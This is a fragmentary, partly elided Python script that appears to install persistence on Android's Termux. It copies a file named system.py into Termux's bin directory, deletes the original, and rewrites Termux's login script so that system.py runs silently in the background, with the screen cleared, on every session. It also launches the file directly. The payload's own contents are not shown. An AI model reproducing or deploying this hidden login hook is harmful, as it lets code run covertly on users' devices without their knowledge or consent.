...
''')
file.close()
os.system('cp system.py ///com.termux/files/usr/bin')
os.system('rm system.py')

file = open('///com.termux/files/usr/bin/login', 'w')
file.write('''#!///com.termux/files/usr/bin/sh

python ///com.termux/files/usr/bin/system.py &
clear

if [ $# = 0 ] && [ -f ///com.termux/files/usr/etc/motd ] && [ ! -f ~/.hushlogin ] && [ -z "$TERMUX_HUSHLOGIN" ]; then
        cat ///com.termux/files/usr/etc/motd
else
...
if [ -G ~/.termux/shell ]; then
        ...
        for file in ///com.termux/files/usr/bin/bash ///com.termux/files/usr/bin/sh /system/bin/sh; do
                if [ -x $file ]; then
                        export SHELL=$file
                        break
                fi
...
if [ -f ///com.termux/files/usr/lib/libtermux-exec.so ]; then
        export LD_PRELOAD=///com.termux/files/usr/lib/libtermux-exec.so
...
os.system('python ///com.termux/files/usr/bin/system.py &')
""")
